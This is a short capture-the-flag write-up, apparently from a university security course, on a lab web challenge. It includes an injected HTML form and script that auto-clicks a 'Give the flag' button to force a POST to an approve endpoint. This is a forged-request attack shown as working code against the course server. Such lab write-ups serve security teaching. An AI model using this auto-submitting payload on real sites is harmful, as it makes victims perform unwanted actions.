![alt text](img/Screenshot%202022-12-15%20at%2003.58.37.JPG)

We open a home page and see a ``submit``button and an ID.

![alt text](img/Screenshot%202022-12-15%20at%2003.59.04.JPG)

When we submit the previous form, this page appears, with 2 buttons that can't be clicked, and its URL contains the ID in the Homepage.

![alt text](img/Screenshot%202022-12-15%20at%2004.07.57.JPG)

When we inspect the page, we see the ``Give the flag`` button is associated with the ID in the Homepage. 
With this info, ww understood that we would need to perform the injection in the URL ``ctf-fsi.fe.up.pt:5005/request/7f8239235c090b367f448c2280247c8c78f40726/approve`` and would have to create a script that would automatically click on the "Give the flag" button, that would be identified by the "giveflag" ID. Thus, we created the following script:

```js
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/7f8239235c090b367f448c2280247c8c78f40726/approve" role="form"><div class="submit"><input type="submit" id='giveflag' value="Give the flag"></div></form><script type="text/javascript">document.getElementById("giveflag").click();</script>
```

![alt text](img/Screenshot%202022-12-15%20at%2004.01.34.JPG)

After performing the attack, we were redirected to the following screen. After disabling JavaScript in our web browser, we were  able to get the flag:

![alt text](img/Screenshot%202022-12-15%20at%2004.31.26.JPG)